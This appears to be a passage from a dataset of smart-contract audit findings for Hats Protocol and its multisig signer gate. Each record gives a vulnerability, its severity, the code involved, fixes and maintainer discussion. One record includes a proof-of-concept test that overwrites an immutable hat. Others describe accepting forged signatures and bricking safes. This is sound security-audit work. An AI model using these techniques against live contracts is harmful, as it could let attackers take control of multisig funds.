issue.\nspengrah\n@zobront ah ok, I see what you're saying. This is definitely something that should be documented more clearly: an assumption is that the safe itself (controlled by the signers) does not have authority over the `signersHat(s)`, ie is neither an admin, eligibility module, or toggle module. It wouldn't make sense for this to be the case and still expect the signers to not be able to control their own hat(s).\nSo, this is ok, and I'll push a documentation/comments update."чSigners can change the threshold of the vault, giving themselves increased control over future transactions and breaking an important trust assumption of the protocol.\nCode Snippet\nTool used\nManual Review
Hats can be overwrittenчmediumч```\n    function _createHat(\n        uint256 _id,\n        string calldata _details,\n        uint32 _maxSupply,\n        address _eligibility,\n        address _toggle,\n        bool _mutable,\n        string calldata _imageURI\n    ) internal returns (Hat memory hat) {\n        hat.details = _details;\n        hat.maxSupply = _maxSupply;\n        hat.eligibility = _eligibility;\n        hat.toggle = _toggle;\n        hat.imageURI = _imageURI;\n        hat.config = _mutable ? uint96(3 << 94) : uint96(1 << 95);\n        _hats[_id] = hat;\n\n\n        emit HatCreated(_id, _details, _maxSupply, _eligibility, _toggle, _mutable, _imageURI);\n    }\n```\nчChild hats can be created under a non-existent admin. Creating the admin allows overwriting the properties of the child-hats, which goes against the immutability of hats.\n```\n    function _createHat(\n        uint256 _id,\n        string calldata _details,\n        uint32 _maxSupply,\n        address _eligibility,\n        address _toggle,\n        bool _mutable,\n        string calldata _imageURI\n    ) internal returns (Hat memory hat) {\n        hat.details = _details;\n        hat.maxSupply = _maxSupply;\n        hat.eligibility = _eligibility;\n        hat.toggle = _toggle;\n        hat.imageURI = _imageURI;\n        hat.config = _mutable ? uint96(3 << 94) : uint96(1 << 95);\n        _hats[_id] = hat;\n\n\n        emit HatCreated(_id, _details, _maxSupply, _eligibility, _toggle, _mutable, _imageURI);\n    }\n```\n\nNow, the next eligible hat for this admin is 1.1.1, which is a hat that was already created and minted. This can allow the admin to change the properties of the child, even if the child hat was previously immutable. This contradicts the immutability of hats, and can be used to rug users in multiple ways, and is thus classified as high severity. This attack can be carried out by any hat wearer on their child tree, mutating their properties.ч"Check if admin exists, before minting by checking any of its properties against default values\n```\nrequire(_hats[admin].maxSupply > 0, ""Admin not created"")\n```\n\nDiscussion\nspengrah\nThe ability for an admin to skip levels when creating hats is a desired feature. However, we definitely do not want those hats to be able to overwritten if/when the skipped admins are created. Therefore, what we need to do is not overwrite a hat's `lastHatId` property when creating it.\nFor example, add something like the following to _createHat:\n```\nuint16 lastId = hat.lastHatId;\nif (lastId > 0) hat.lastHatId = lastId;\n```\n\nspengrah\nhttps://github.com/Hats-Protocol/hats-protocol/pull/109"чCode Snippet\nThe attack can be demonstrated with the following code which carries out the following steps:\nChild 1.1.1 is created with max supply 10, and false mutability. Thus its properties should be locked.\nAdmin 1.1.0 is created\nChild 1.1.1 is re-created, now with supply of 20, overwriting its previous instance\nThe children are shown to be on the same hatId, and their max supplies are shown to be different values.\n```\nfunction testATTACKoverwrite() public {\n        vm.startPrank(address(topHatWearer));\n        uint256 emptyAdmin = hats.getNextId(topHatId);\n        uint256 child1 = hats.createHat(\n            emptyAdmin,\n            _details,\n            10,\n            _eligibility,\n            _toggle,\n            false,\n            secondHatImageURI\n        );\n        (, uint256 maxsup, , , , , , , ) = hats.viewHat(child1);\n        assertEq(maxsup, 10);\n        hats.createHat(\n            topHatId,\n            _details,\n            _maxSupply,\n            _eligibility,\n            _toggle,\n            false,\n            secondHatImageURI\n        );\n        uint256 child2 = hats.createHat(\n            emptyAdmin,\n            _details,\n            20,\n            _eligibility,\n            _toggle,\n            false,\n            secondHatImageURI\n        );\n        (,  maxsup, , , , , , , ) = hats.viewHat(child1);\n        assertEq(child1, child2);\n        assertEq(maxsup, 20);\n    }\n```\n\nTool used\nManual Review
targetThreshold can be set below minThreshold, violating important invariantчmediumч```\nfunction _setMinThreshold(uint256 _minThreshold) internal {\n    if (_minThreshold > maxSigners || _minThreshold > targetThreshold) {\n        revert InvalidMinThreshold();\n    }\n\n    minThreshold = _minThreshold;\n}\n```\nчThere are protections in place to ensure that `minThreshold` is not set above `targetThreshold`, because the result is that the max threshold on the safe would be less than the minimum required. However, this check is not performed when `targetThreshold` is set, which results in the same situation.\n```\nfunction _setMinThreshold(uint256 _minThreshold) internal {\n    if (_minThreshold > maxSigners || _minThreshold > targetThreshold) {\n        revert InvalidMinThreshold();\n    }\n\n    minThreshold = _minThreshold;\n}\n```\n\nHowever, when `targetThreshold` is set, there is no equivalent check that it remains above minThreshold:\n```\nfunction _setTargetThreshold(uint256 _targetThreshold) internal {\n    if (_targetThreshold > maxSigners) {\n        revert InvalidTargetThreshold();\n    }\n\n    targetThreshold = _targetThreshold;\n}\n```\n\nThis is a major problem, because if it is set lower than `minThreshold`, `reconcileSignerCount()` will set the safe's threshold to be this value, which is lower than the minimum, and will cause all tranasctions to fail.чPerform a check in `_setTargetThreshold()` that it is greater than or equal to minThreshold:\n```\nfunction _setTargetThreshold(uint256 _targetThreshold) internal {\n// Add the line below\n   if (_targetThreshold < minThreshold) {\n// Add the line below\n     revert InvalidTargetThreshold();\n// Add the line below\n   }\n    if (_targetThreshold > maxSigners) {\n        revert InvalidTargetThreshold();\n    }\n\n    targetThreshold = _targetThreshold;\n}\n```\n\nDiscussion\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/8чSettings that are intended to be guarded are not, which can lead to parameters being set in such a way that all transactions fail.\nCode Snippet\nTool used\nManual Review
Swap Signer fails if final owner is invalid due to off by one error in loopчmediumч```\nif (ownerCount >= maxSigs) {\n    bool swapped = _swapSigner(owners, ownerCount, maxSigs, currentSignerCount, msg.sender);\n    if (!swapped) {\n        // if there are no invalid owners, we can't add a new signer, so we revert\n        revert NoInvalidSignersToReplace();\n    }\n}\n```\nч"New users attempting to call `claimSigner()` when there is already a full slate of owners are supposed to kick any invalid owners off the safe in order to swap in and take their place. However, the loop that checks this has an off-by-one error that misses checking the final owner.\nWhen `claimSigner()` is called, it adds the `msg.sender` as a signer, as long as there aren't already too many owners on the safe.\nHowever, in the case that there are already the maximum number of owners on the safe, it performs a check whether any of them are invalid. If they are, it swaps out the invalid owner for the new owner.\n```\nif (ownerCount >= maxSigs) {\n    bool swapped = _swapSigner(owners, ownerCount, maxSigs, currentSignerCount, msg.sender);\n    if (!swapped) {\n        // if there are no invalid owners, we can't add a new signer, so we revert\n        revert NoInvalidSignersToReplace();\n    }\n}\n```\n\n```\nfunction _swapSigner(\n    address[] memory _owners,\n    uint256 _ownerCount,\n    uint256 _maxSigners,\n    uint256 _currentSignerCount,\n    address _signer\n) internal returns (bool success) {\n    address ownerToCheck;\n    bytes memory data;\n\n    for (uint256 i; i < _ownerCount - 1;) {\n        ownerToCheck = _owners[i];\n\n        if (!isValidSigner(ownerToCheck)) {\n            // prep the swap\n            data = abi.encodeWithSignature(\n                ""swapOwner(address,address,address)"",\n                _findPrevOwner(_owners, ownerToCheck), // prevOwner\n                ownerToCheck, // oldOwner\n                _signer // newOwner\n            );\n\n            // execute the swap, reverting if it fails for some reason\n            success = safe.execTransactionFromModule(\n                address(safe), // to\n                0, // value\n                data, // data\n                Enum.Operation.Call // operation\n            );\n\n            if (!success) {\n                revert FailedExecRemoveSigner();\n            }\n\n            if (_currentSignerCount < _maxSigners) ++signerCount;\n            break;\n        }\n        unchecked {\n            ++i;\n        }\n    }\n}\n```\n\nThis function is intended to iterate through all the owners, check if any is no longer valid, and — if that's the case — swap it for the new one.\nHowever, in the case that all owners are valid except for the final one, it will miss the swap and reject the new owner.\nThis is because there is an off by one error in the loop, where it iterates through `for (uint256 i; i < _ownerCount - 1;)...`\nThis only iterates through all the owners up until the final one, and will miss the check for the validity and possible swap of the final owner."чPerform the loop with `ownerCount` instead of `ownerCount` - 1 to check all owners:\n```\n// Remove the line below\n for (uint256 i; i < _ownerCount // Remove the line below\n 1;) {\n// Add the line below\n for (uint256 i; i < _ownerCount ;) {\n     ownerToCheck = _owners[i];\n    // rest of code\n}\n```\n\nDiscussion\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/12чWhen only the final owner is invalid, new users will not be able to claim their role as signer, even through they should.\nCode Snippet\nTool used\nManual Review
If a hat is owned by address(0), phony signatures will be accepted by the safeчmediumч```\nfunction isValidSigner(address _account) public view override returns (bool valid) {\n    valid = HATS.isWearerOfHat(_account, signersHatId);\n}\n```\nчIf a hat is sent to `address(0)`, the multisig will be fooled into accepting phony signatures on its behalf. This will throw off the proper accounting of signatures, allowing non-majority transactions to pass and potentially allowing users to steal funds.\nThe function uses `ecrecover` to get the signer. However, `ecrecover` is well known to return `address(0)` in the event that a phony signature is passed with a `v` value other than 27 or 28. See this example for how this can be done.\nIn the event that this is a base with only a single hat approved for signing, the `isValidSigner()` function will simply check if the owner is the wearer of a hat:\n```\nfunction isValidSigner(address _account) public view override returns (bool valid) {\n    valid = HATS.isWearerOfHat(_account, signersHatId);\n}\n```\n\n```\nfunction isWearerOfHat(address _user, uint256 _hatId) public view returns (bool isWearer) {\n    isWearer = (balanceOf(_user, _hatId) > 0);\n}\n```\n\n... which only checks if it is active or eligible...\n```\nfunction balanceOf(address _wearer, uint256 _hatId)\n    public\n    view\n    override(ERC1155, IHats)\n    returns (uint256 balance)\n{\n    Hat storage hat = _hats[_hatId];\n\n    balance = 0;\n\n    if (_isActive(hat, _hatId) && _isEligible(_wearer, hat, _hatId)) {\n        balance = super.balanceOf(_wearer, _hatId);\n    }\n}\n```\n\n... which calls out to ERC1155, which just returns the value in storage (without any address(0) check)...\n```\nfunction balanceOf(address owner, uint256 id) public view virtual returns (uint256 balance) {\n    balance = _balanceOf[owner][id];\n}\n```\n\nThe result is that, if a hat ends up owned by `address(0)` for any reason, this will give blanket permission for anyone to create a phony signature that will be accepted by the safe.\nYou could imagine a variety of situations where this may apply:\nAn admin minting a mutable hat to address(0) to adjust the supply while waiting for a delegatee to send over their address to transfer the hat to\nAn admin sending a hat to address(0) because there is some reason why they need the supply slightly inflated\nAn admin accidentally sending a hat to address(0) to burn it\nNone of these examples are extremely likely, but there would be no reason for the admin to think they were putting their multisig at risk for doing so. However, the result would be a free signer on the multisig, which would have dramatic consequences.чThe easiest option is to add a check in `countValidSignatures()` that confirms that `currentOwner != address(0)` after each iteration.\nDiscussion\nzobront\nNo fix made for this but it's solved by the fix to #50.чIf a hat is sent to `address(0)`, any phony signature can be accepted by the safe, leading to transactions without sufficient support being executed.\nThis is particularly dangerous in a 2/3 situation, where this issue would be sufficient for a single party to perform arbitrary transactions.\nCode Snippet\nTool used\nManual Review
If signer gate is deployed to safe with more than 5 existing modules, safe will be brickedчmediumч```\n(address[] memory modules,) = GnosisSafe(payable(_safe)).getModulesPaginated(SENTINEL_MODULES, 5);\nuint256 existingModuleCount = modules.length;\n```\nч`HatsSignerGate` can be deployed with a fresh safe or connected to an existing safe. In the event that it is connected to an existing safe, it pulls the first 5 modules from that safe to count the number of connected modules. If there are more than 5 modules, it silently only takes the first five. This results in a mismatch between the real number of modules and `enabledModuleCount`, which causes all future transactions to revert.\nWhen a `HatsSignerGate` is deployed to an existing safe, it pulls the existing modules with the following code:\n```\n(address[] memory modules,) = GnosisSafe(payable(_safe)).getModulesPaginated(SENTINEL_MODULES, 5);\nuint256 existingModuleCount = modules.length;\n```\n\nBecause the modules are requested paginated with `5` as the second argument, it will return a maximum of `5` modules. If the safe already has more than `5` modules, only the first `5` will be returned.\nThe result is that, while the safe has more than 5 modules, the gate will be set up with `enabledModuleCount = 5 + 1`.\nWhen a transaction is executed, `checkTransaction()` will get the hash of the first 6 modules:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n\nAfter the transaction, the first 7 modules will be checked to compare it:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\nif (keccak256(abi.encode(modules)) != _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```\n\nSince it already had more than 5 modules (now 6, with HatsSignerGate added), there will be a 7th module and the two hashes will be different. This will cause a revert.\nThis would be a high severity issue, except that in the comments for the function it says:\n/// @dev Do not attach HatsSignerGate to a Safe with more than 5 existing modules; its signers will not be able to execute any transactions\nThis is the correct recommendation, but given the substantial consequences of getting it wrong, it should be enforced in code so that a safe with more modules reverts, rather than merely suggested in the comments.чThe `deployHatsSignerGate()` function should revert if attached to a safe with more than 5 modules:\n```\nfunction deployHatsSignerGate(\n    uint256 _ownerHatId,\n    uint256 _signersHatId,\n    address _safe, // existing Gnosis Safe that the signers will join\n    uint256 _minThreshold,\n    uint256 _targetThreshold,\n    uint256 _maxSigners\n) public returns (address hsg) {\n    // count up the existing modules on the safe\n    (address[] memory modules,) = GnosisSafe(payable(_safe)).getModulesPaginated(SENTINEL_MODULES, 5);\n    uint256 existingModuleCount = modules.length;\n// Add the line below\n   (address[] memory modulesWithSix,) = GnosisSafe(payable(_safe)).getModulesPaginated(SENTINEL_MODULES, 6);\n// Add the line below\n   if (modules.length != moduleWithSix.length) revert TooManyModules();\n\n    return _deployHatsSignerGate(\n        _ownerHatId, _signersHatId, _safe, _minThreshold, _targetThreshold, _maxSigners, existingModuleCount\n    );\n}\n```\n\nDiscussion\nspengrah\nBased on other findings, considering removing the ability for any other modules to exist alongside HSG. If we go that route, the fix here would likely be to revert if `modulesWith1.length > 0`.\ncc @zobront\nzobront\nGreat, I agree with that.\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/10чIf a HatsSignerGate is deployed and connected to a safe with more than 5 existing modules, all future transactions sent through that safe will revert.\nCode Snippet\nTool used\nManual Review
[Medium][Outdated State] `_removeSigner` incorrectly updates `signerCount` and safe `threshold`чmediumч```\n        if (validSignerCount == currentSignerCount) {\n            newSignerCount = currentSignerCount;\n        } else {\n            newSignerCount = currentSignerCount - 1;\n        }\n```\nч`_removeSigner` can be called whenever a signer is no longer valid to remove an invalid signer. However, under certain situations, `removeSigner` incorrectly reduces the number of `signerCount` and sets the `threshold` incorrectly.\n`_removeSigner` uses the code snippet below to decide if the number of `signerCount` should be reduced:\n```\n        if (validSignerCount == currentSignerCount) {\n            newSignerCount = currentSignerCount;\n        } else {\n            newSignerCount = currentSignerCount - 1;\n        }\n```\n\nIf first clause is supposed to be activated when `validSignerCount` and `currentSignerCount` are still in sync, and we want to remove an invalid signer. The second clause is for when we need to identify a previously active signer which is inactive now and want to remove it. However, it does not take into account if a previously in-active signer became active. In the scenario described below, the `signerCount` would be updated incorrectly:\n(1) Lets imagine there are 5 signers where 0, 1 and 2 are active while 3 and 4 are inactive, the current `signerCount = 3` (2) In case number 3 regains its hat, it will become active again (3) If we want to delete signer 4 from the owners' list, the `_removeSigner` function will go through the signers and find 4 valid signers, since there were previously 3 signers, `validSignerCount == currentSignerCount` would be false. (4) In this case, while the number of `validSingerCount` increased, the `_removeSigner` reduces one.ч
The Hats contract needs to override the ERC1155.balanceOfBatch functionчmediumч```\n    function balanceOf(address _wearer, uint256 _hatId)\n        public\n        view\n        override(ERC1155, IHats)\n        returns (uint256 balance)\n    {\n        Hat storage hat = _hats[_hatId];\n\n        balance = 0;\n\n        if (_isActive(hat, _hatId) && _isEligible(_wearer, hat, _hatId)) {\n            balance = super.balanceOf(_wearer, _hatId);\n        }\n    }\n```\nч"The Hats contract does not override the ERC1155.balanceOfBatch function\nThe Hats contract overrides the ERC1155.balanceOf function to return a balance of 0 when the hat is inactive or the wearer is ineligible.\n```\n    function balanceOf(address _wearer, uint256 _hatId)\n        public\n        view\n        override(ERC1155, IHats)\n        returns (uint256 balance)\n    {\n        Hat storage hat = _hats[_hatId];\n\n        balance = 0;\n\n        if (_isActive(hat, _hatId) && _isEligible(_wearer, hat, _hatId)) {\n            balance = super.balanceOf(_wearer, _hatId);\n        }\n    }\n```\n\nBut the Hats contract does not override the ERC1155.balanceOfBatch function, which causes balanceOfBatch to return the actual balance no matter what the circumstances.\n```\n    function balanceOfBatch(address[] calldata owners, uint256[] calldata ids)\n        public\n        view\n        virtual\n        returns (uint256[] memory balances)\n    {\n        require(owners.length == ids.length, ""LENGTH_MISMATCH"");\n\n        balances = new uint256[](owners.length);\n\n        // Unchecked because the only math done is incrementing\n        // the array index counter which cannot possibly overflow.\n        unchecked {\n            for (uint256 i = 0; i < owners.length; ++i) {\n                balances[i] = _balanceOf[owners[i]][ids[i]];\n            }\n        }\n    }\n```\n"чConsider overriding the ERC1155.balanceOfBatch function in Hats contract to return 0 when the hat is inactive or the wearer is ineligible.\nDiscussion\nspengrah\nhttps://github.com/Hats-Protocol/hats-protocol/pull/102\nzobront\nReverting solves the problem, but I'm curious why revert instead of just replacing:\n```\nbalances[i] = _balanceOf[owners[i]][ids[i]];\n```\n\nwith...\n```\nbalances[i] = balanceOf(owners[i], ids[i]);\n```\n\nzobront\nReverting solves the problem, but I'm curious why revert instead of just replacing:\n```\nbalances[i] = _balanceOf[owners[i]][ids[i]];\n```\n\nwith...\n```\nbalances[i] = balanceOf(owners[i], ids[i]);\n```\nчThis will make balanceOfBatch return a different result than balanceOf, which may cause errors when integrating with other projects\nCode Snippet\nTool used\nManual Review
Unbound recursive function call can use unlimited gas and break hats operationчmediumч```\n    function isAdminOfHat(address _user, uint256 _hatId) public view returns (bool isAdmin) {\n        uint256 linkedTreeAdmin;\n        uint32 adminLocalHatLevel;\n        if (isLocalTopHat(_hatId)) {\n            linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n            if (linkedTreeAdmin == 0) {\n                // tree is not linked\n                return isAdmin = isWearerOfHat(_user, _hatId);\n            } else {\n                // tree is linked\n                if (isWearerOfHat(_user, linkedTreeAdmin)) {\n                    return isAdmin = true;\n                } // user wears the treeAdmin\n                else {\n                    adminLocalHatLevel = getLocalHatLevel(linkedTreeAdmin);\n                    _hatId = linkedTreeAdmin;\n                }\n            }\n        } else {\n            // if we get here, _hatId is not a tophat of any kind\n            // get the local tree level of _hatId's admin\n            adminLocalHatLevel = getLocalHatLevel(_hatId) - 1;\n        }\n\n        // search up _hatId's local address space for an admin hat that the _user wears\n        while (adminLocalHatLevel > 0) {\n            if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, adminLocalHatLevel))) {\n                return isAdmin = true;\n            }\n            // should not underflow given stopping condition > 0\n            unchecked {\n                --adminLocalHatLevel;\n            }\n        }\n\n        // if we get here, we've reached the top of _hatId's local tree, ie the local tophat\n        // check if the user wears the local tophat\n        if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, 0))) return isAdmin = true;\n\n        // if not, we check if it's linked to another tree\n        linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n        if (linkedTreeAdmin == 0) {\n            // tree is not linked\n            // we've already learned that user doesn't wear the local tophat, so there's nothing else to check; we return false\n            return isAdmin = false;\n        } else {\n            // tree is linked\n            // check if user is wearer of linkedTreeAdmin\n            if (isWearerOfHat(_user, linkedTreeAdmin)) return true;\n            // if not, recurse to traverse the parent tree for a hat that the user wears\n            isAdmin = isAdminOfHat(_user, linkedTreeAdmin);\n        }\n    }\n```\nч"some of the functions in the Hats and HatsIdUtilities contracts has recursive logics without limiting the number of iteration, this can cause unlimited gas usage if hat trees has huge depth and it won't be possible to call the contracts functions. functions `getImageURIForHat()`, `isAdminOfHat()`, `getTippyTopHatDomain()` and `noCircularLinkage()` would revert and because most of the logics callings those functions so contract would be in broken state for those hats.\nThis is function `isAdminOfHat()` code:\n```\n    function isAdminOfHat(address _user, uint256 _hatId) public view returns (bool isAdmin) {\n        uint256 linkedTreeAdmin;\n        uint32 adminLocalHatLevel;\n        if (isLocalTopHat(_hatId)) {\n            linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n            if (linkedTreeAdmin == 0) {\n                // tree is not linked\n                return isAdmin = isWearerOfHat(_user, _hatId);\n            } else {\n                // tree is linked\n                if (isWearerOfHat(_user, linkedTreeAdmin)) {\n                    return isAdmin = true;\n                } // user wears the treeAdmin\n                else {\n                    adminLocalHatLevel = getLocalHatLevel(linkedTreeAdmin);\n                    _hatId = linkedTreeAdmin;\n                }\n            }\n        } else {\n            // if we get here, _hatId is not a tophat of any kind\n            // get the local tree level of _hatId's admin\n            adminLocalHatLevel = getLocalHatLevel(_hatId) - 1;\n        }\n\n        // search up _hatId's local address space for an admin hat that the _user wears\n        while (adminLocalHatLevel > 0) {\n            if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, adminLocalHatLevel))) {\n                return isAdmin = true;\n            }\n            // should not underflow given stopping condition > 0\n            unchecked {\n                --adminLocalHatLevel;\n            }\n        }\n\n        // if we get here, we've reached the top of _hatId's local tree, ie the local tophat\n        // check if the user wears the local tophat\n        if (isWearerOfHat(_user, getAdminAtLocalLevel(_hatId, 0))) return isAdmin = true;\n\n        // if not, we check if it's linked to another tree\n        linkedTreeAdmin = linkedTreeAdmins[getTopHatDomain(_hatId)];\n        if (linkedTreeAdmin == 0) {\n            // tree is not linked\n            // we've already learned that user doesn't wear the local tophat, so there's nothing else to check; we return false\n            return isAdmin = false;\n        } else {\n            // tree is linked\n            // check if user is wearer of linkedTreeAdmin\n            if (isWearerOfHat(_user, linkedTreeAdmin)) return true;\n            // if not, recurse to traverse the parent tree for a hat that the user wears\n            isAdmin = isAdminOfHat(_user, linkedTreeAdmin);\n        }\n    }\n```\n\nAs you can see this function calls itself recursively to check that if user is wearer of the one of the upper link hats of the hat or not. if the chain(depth) of the hats in the tree become very long then this function would revert because of the gas usage and the gas usage would be high enough so it won't be possible to call this function in a transaction. functions `getImageURIForHat()`, `getTippyTopHatDomain()` and `noCircularLinkage()` has similar issues and the gas usage is depend on the tree depth. the issue can happen suddenly for hats if the top level topHat decide to add link, for example:\nHat1 is linked to chain of the hats that has 1000 ""root hat"" and the topHat (tippy hat) is TIPHat1.\nHat2 is linked to chain of the hats that has 1000 ""root hat"" and the topHat (tippy hat) is TIPHat2.\nadmin of the TIPHat1 decides to link it to the Hat2 and all and after performing that the total depth of the tree would increase to 2000 and transactions would cost double time gas."ч"code should check and make sure that hat levels has a maximum level and doesn't allow actions when this level breaches. (keep depth of each tophat's tree and update it when actions happens and won't allow actions if they increase depth higher than the threshold)\nDiscussion\nspengrah\nTentative solution is to cap the number of nested trees at a reasonable value that ensures the tippy top hat will always be able to exercise its admin rights over the lowest tree, eg `10`\nCount the number of nested trees in the would-be child tree\nCount the number of nested trees in the would-be parent tree\nIf sum of values (1) and (2) exceeds the cap, revert\nWe can calculate (1) and (2) by incrementing a counter each step up as we traverse the `linkedTreeAdmins` mapping, potentially in `noCircularLinkage()`.\ncc @zobront\nspengrah\nWill need to test out gas impacts of higher numbers of nested trees to find a good cap value.\nzobront\n@spengrah Agree this is the best solution. Two questions:\nWill you try to cap to an amount where the gas price will be reasonable, or where it'll fit in a block?\nIf this differs by chain, will you have different versions by chain, or keep them consistent at mainnet values?\nspengrah\nGreat questions @zobront. Overall, I would strongly prefer to not have different versions across different networks, so will likely constrain cheaper / higher capacity networks based on the limits of more expensive networks.\nThat said, I think it should be up to the user org to determine the cost their willing to spend to add more trees, so overall I think I'm likely to set the cap based on block size rather than gas price.\nspengrah\n@zobront after further research, it's actually going to be pretty expensive to enforce a cap. We can relatively easily count the depth of the would-be parent tree (step 2 above) since we can traverse up the ""linked list"" of the linkedTreeAdmin mapping. But counting the depth of the would-be child would require a new data model since we need to count down.\nSo, at this point in the process, what I think is most appropriate is to document this risk and recommend that any tophats that have more than N (say, 10) nested trees below them not grant any authorities to the trees below N.\nspengrah\n@zobront We figured out a fix!\nWas thinking that the additional data structure needed to count down would be onerous, but realized that we can just add another mapping that goes the other way, basically creating a doubly-linked list without having to impact the first mapping. So we can now count down pretty easily.\nhttps://github.com/Hats-Protocol/hats-protocol/pull/118"чit won't be possible to perform actions for those hats and funds can be lost because of it.\nCode Snippet\nTool used\nManual Review
Safe can be bricked because threshold is updated with validSignerCount instead of newThresholdчhighч```\nif (validSignerCount <= target && validSignerCount != currentThreshold) {\n    newThreshold = validSignerCount;\n} else if (validSignerCount > target && currentThreshold < target) {\n    newThreshold = target;\n}\n```\nчThe safe's threshold is supposed to be set with the lower value of the `validSignerCount` and the `targetThreshold` (intended to serve as the maximum). However, the wrong value is used in the call to the safe's function, which in some circumstances can lead to the safe being permanently bricked.\nIn `reconcileSignerCount()`, the valid signer count is calculated. We then create a value called `newThreshold`, and set it to the minimum of the valid signer count and the target threshold. This is intended to be the value that we update the safe's threshold with.\n```\nif (validSignerCount <= target && validSignerCount != currentThreshold) {\n    newThreshold = validSignerCount;\n} else if (validSignerCount > target && currentThreshold < target) {\n    newThreshold = target;\n}\n```\n\nHowever, there is a typo in the contract call, which accidentally uses `validSignerCount` instead of `newThreshold`.\nThe result is that, if there are more valid signers than the `targetThreshold` that was set, the threshold will be set higher than intended, and the threshold check in `checkAfterExecution()` will fail for being above the max, causing all safe transactions to revert.\nThis is a major problem because it cannot necessarily be fixed. In the event that it is a gate with a single hat signer, and the eligibility module for the hat doesn't have a way to turn off eligibility, there will be no way to reduce the number of signers. If this number is greater than `maxSigners`, there is no way to increase `targetThreshold` sufficiently to stop the reverting.\nThe result is that the safe is permanently bricked, and will not be able to perform any transactions.ч"
Changing hat toggle address can lead to unexpected changes in statusчmediumч```\nfunction changeHatToggle(uint256 _hatId, address _newToggle) external {\n    if (_newToggle == address(0)) revert ZeroAddress();\n\n    _checkAdmin(_hatId);\n    Hat storage hat = _hats[_hatId];\n\n    if (!_isMutable(hat)) {\n        revert Immutable();\n    }\n\n    hat.toggle = _newToggle;\n\n    emit HatToggleChanged(_hatId, _newToggle);\n}\n```\nчChanging the toggle address should not change the current status unless intended to. However, in the event that a contract's toggle status hasn't been synced to local state, this change can accidentally toggle the hat back on when it isn't intended.\nWhen an admin for a hat calls `changeHatToggle()`, the `toggle` address is updated to a new address they entered:\n```\nfunction changeHatToggle(uint256 _hatId, address _newToggle) external {\n    if (_newToggle == address(0)) revert ZeroAddress();\n\n    _checkAdmin(_hatId);\n    Hat storage hat = _hats[_hatId];\n\n    if (!_isMutable(hat)) {\n        revert Immutable();\n    }\n\n    hat.toggle = _newToggle;\n\n    emit HatToggleChanged(_hatId, _newToggle);\n}\n```\n\nToggle addresses can be either EOAs (who must call `setHatStatus()` to change the local config) or contracts (who must implement the `getHatStatus()` function and return the value).\nThe challenge comes if a hat has a toggle address that is a contract. The contract changes its toggle value to `false` but is never checked (which would push the update to the local state). The admin thus expects that the hat is turned off.\nThen, the toggle is changed to an EOA. One would expect that, until a change is made, the hat would remain in the same state, but in this case, the hat defaults back to its local storage state, which has not yet been updated and is therefore set to `true`.\nEven in the event that the admin knows this and tries to immediately toggle the status back to `false`, it is possible for a malicious user to sandwich their transaction between the change to the EOA and the transaction to toggle the hat off, making use of a hat that should be off. This could have dramatic consequences when hats are used for purposes such as multisig signing.ч"The `changeHatToggle()` function needs to call `checkHatToggle()` before changing over to the new toggle address, to ensure that the latest status is synced up.\nDiscussion\nspengrah\nThe risk here is limited since toggle modules are treated as the source of truth for hat status and so admins should be aware that changing the toggle also changes the source of truth. But the recommended fix is simple and cheap enough that it makes sense to apply.\n@zobront, does this same concept apply to eligibility?\nzobront\n@spengrah Agreed. The only situation I think would break a user's assumption is a change from contract => EOA, because in most cases the toggle will be saved in `hat.config` (so they won't need to take any action), but in this edge case it will be reset to an old version. That inconsistent behavior is the root of the problem.\nThe same is true with `eligibility`, but not sure if there's anything you can do about it, because it's on an individual hat by hat basis. If the `eligibility` contract is changed, you can't go through all the hats and update them. So my advice is just to be sure to document it very clearly in this case.\nspengrah\nhttps://github.com/Hats-Protocol/hats-protocol/pull/116\ncducrest\nEscalate for 10 USDC\nDisagree with being sever enough for being a medium. The Sherlock doc state ""The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team."" However, as was explained, this problem is present both for `status` and `eligibility`, and a fix is possible and implemented in https://github.com/Hats-Protocol/hats-protocol/pull/116 only for `status`, proving that the risk is acceptable for the `eligibility` part thus acceptable for the `status` part.\nAs noted in the comment by spengrah, the fix was implemented mostly because it is not expensive to do so, even though the risk is limited.\nsherlock-admin\nEscalate for 10 USDC\nDisagree with being sever enough for being a medium. The Sherlock doc state ""The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team."" However, as was explained, this problem is present both for `status` and `eligibility`, and a fix is possible and implemented in https://github.com/Hats-Protocol/hats-protocol/pull/116 only for `status`, proving that the risk is acceptable for the `eligibility` part thus acceptable for the `status` part.\nAs noted in the comment by spengrah, the fix was implemented mostly because it is not expensive to do so, even though the risk is limited.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation rejected\nThe issue is a valid medium Given the edge case that the attack is still possible and can cause a hat to be activated which should not be and vice versa.\nsherlock-admin\nEscalation rejected\nThe issue is a valid medium Given the edge case that the attack is still possible and can cause a hat to be activated which should not be and vice versa.\nThis issue's escalations have been rejected!\nWatsons who escalated this issue will have their escalation amount deducted from their next payout."чHats may unexpectedly be toggled from `off` to `on` during toggle address transfer, reactivating hats that are intended to be turned `off`.\nCode Snippet\nTool used\nManual Review
